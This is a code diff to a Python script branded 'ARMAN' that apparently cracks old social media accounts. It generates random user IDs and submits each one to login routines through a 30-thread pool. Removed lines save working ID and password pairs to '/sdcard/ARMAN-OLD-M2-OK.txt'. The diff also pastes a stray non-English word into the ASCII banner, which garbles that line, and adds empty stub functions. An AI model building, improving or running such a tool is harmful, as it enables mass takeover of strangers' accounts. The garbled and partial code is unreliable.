@@ -369,12 +369,11 @@ def show_branding():
     else:
         os.system('clear')
     
-    # Line 495 error fixed using raw string r"""
     print(r"""\033[1;32m
       _    ____  ____  __  __    _    _   _ 
      / \  |  _ \|  _ \|  \/  |  / \  | \ | |
     / _ \ | |_) | |_) | |\/| | / _ \ |  \| |
-   / ___ \|  _ <|  _ <| |  | |/ ___ \| |\  |
+   / ___শিল্পী|  _ <|  _ <| |  | |/ ___ \| |\  |
   /_/   \_\_| \_\_| \_\_|  |_/_/   \_\_| \_|
 \033[0m""")
                
@@ -470,25 +469,30 @@ def old_One():
     star = '10000'
     for _ in range(int(limit)):
         data = str(random.choice(range(1000000000, 1999999999 if ask == '1' else 4999999999)))
-    user.append(data)
+        user.append(data)
     print('        \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 1')
     print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mMETHOD 2')
     linex()
     meth = input("       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;46mCHOICE (A/B): ").strip().upper()
     with tred(max_workers=30) as pool:
         ____banner____()
-        print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-        open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-        oks.append(uid)
-        break
-        elif 'session_key' in po:
-        print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mARMAN\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
-        open('/sdcard/ARMAN-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
-        oks.append(uid)
-        break
-        except Exception as e:
-            pass
-    loop += 1
+        print(f"       \x1b[38;5;196m(\x1b[1;37m★\x1b[38;5;196m)\x1b[1;37m TOTAL IDS : {len(user)}")
+        linex()
+        for mal in user:
+            uid = star + mal
+            if meth == 'A':
+                pool.submit(login_1, uid)
+            elif meth == 'B':
+                pool.submit(login_2, uid)
+            else:
+                print(f" {rad}[!] INVALID METHOD SELECTED")
+                break
+
+def old_Tow():
+    pass
+
+def old_Tree():
+    pass
 
 if __name__ == '__main__':
     if check_key():
